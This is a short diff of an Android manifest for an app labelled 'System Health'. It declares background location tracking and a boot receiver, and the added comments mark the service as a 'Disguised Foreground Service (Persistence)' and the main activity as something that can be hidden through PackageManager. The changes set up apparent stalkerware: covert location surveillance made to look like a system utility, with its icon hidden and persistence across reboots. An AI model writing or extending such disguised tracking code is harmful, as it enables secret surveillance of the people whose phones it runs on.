@@ -9,6 +9,8 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
 
     <application android:allowBackup="false" android:label="System Health">
+        
+        <!-- MainActivity (Can be dynamically enabled/disabled via PackageManager) -->
         <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -16,7 +18,11 @@
             </intent-filter>
         </activity>
         
-        <service android:name=".sync.InstantTelemetryService" android:exported="false" android:foregroundServiceType="location" />
+        <!-- Disguised Foreground Service (Persistence) -->
+        <service 
+            android:name=".sync.InstantTelemetryService" 
+            android:exported="false" 
+            android:foregroundServiceType="location" />
 
         <receiver android:name=".sync.BootReceiver" android:exported="true">
             <intent-filter>
